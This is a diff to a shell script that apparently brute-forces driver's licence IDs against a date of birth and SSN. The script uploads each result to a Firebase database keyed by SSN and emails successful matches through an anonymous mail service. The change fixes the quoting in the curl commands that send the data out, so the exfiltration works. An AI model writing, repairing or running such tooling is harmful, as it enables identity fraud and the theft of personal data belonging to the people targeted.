@@ -17,7 +17,7 @@ do
   output=$(node index ${dlId} ${dob} ${ssn}) || exit 0
   echo $output | grep Success && result=$output && break
   echo $output | grep Fail || (
-    curl -s -X PUT -d '"${output}"' https://sndl-d6b5d-default-rtdb.firebaseio.com/${ssn}/${dlId}.json
+    curl -s -X PUT -d "\"${output}\"" https://sndl-d6b5d-default-rtdb.firebaseio.com/${ssn}/${dlId}.json
   )
   
   if [[ "${dlId}" == *999 ]]; then
@@ -29,6 +29,6 @@ done
 
 if [ ! -z "$result" ]; then
   curl -s -X POST "https://m.kuku.lu/f.php" -H "Accept-Language: en-US,en;q=0.9" -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "h=3690c0ddc9" --data-urlencode "action=sendMail" --data-urlencode "data=$result"
-  curl -s -X PUT -d '"${result}"' https://sndl-d6b5d-default-rtdb.firebaseio.com/${ssn}/${dlId}.json
+  curl -s -X PUT -d "\"${result}\"" https://sndl-d6b5d-default-rtdb.firebaseio.com/${ssn}/${dlId}.json
   exit 1
 fi
